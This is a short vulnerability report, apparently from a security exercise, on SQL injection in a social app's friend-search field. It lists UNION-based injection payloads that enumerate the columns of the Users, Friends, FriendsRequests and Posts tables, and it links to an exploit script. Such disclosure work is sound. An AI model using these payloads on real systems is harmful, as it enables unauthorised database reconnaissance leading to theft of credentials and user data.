# Vulnerability: SQL Injection in My Friends (Search) Field

- Vulnerability: SQL Injection
- Where: `Search` Field in `My Friends` Tab
- Impact: Allows Any User to List all Columns in a Given Table in DB

## Steps to Reproduce
1. Register with a non existing Username
2. Go to `My Friends` Tab
3. Search = `' AND 1 <> 1 UNION SELECT COLUMN_NAME, 1, 1, 1, 1 FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = 'Users' -- `, verifying that you are presented with all Columns in `Users`' Table in DB (`USERNAME`, `PASSWORD`, `NAME`, `ABOUT` and `PHOTO`)
4. Search = `' AND 1 <> 1 UNION SELECT COLUMN_NAME, 1, 1, 1, 1 FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = 'Friends' -- `, verifying that you are presented with all Columns in `Friends`' Table in DB (`ID`, `USERNAME1` and `USERNAME2`)
5. Search = `' AND 1 <> 1 UNION SELECT COLUMN_NAME, 1, 1, 1, 1 FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = 'FriendsRequests' -- `, verifying that you are presented with all Columns in `FriendsRequests`' Table in DB (`ID`, `USERNAME1` and `USERNAME2`)
6. Search = `' AND 1 <> 1 UNION SELECT COLUMN_NAME, 1, 1, 1, 1 FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = 'Posts' -- `, verifying that you are presented with all Columns in `Posts`' Table in DB (`ID`, `AUTHOR`, `CONTENT`, `TYPE`, `CREATED_AT` and `UPDATED_AT`)

## POC
- [Script](./Exploit.py)
- To Run: `../runVulnN.sh 3`
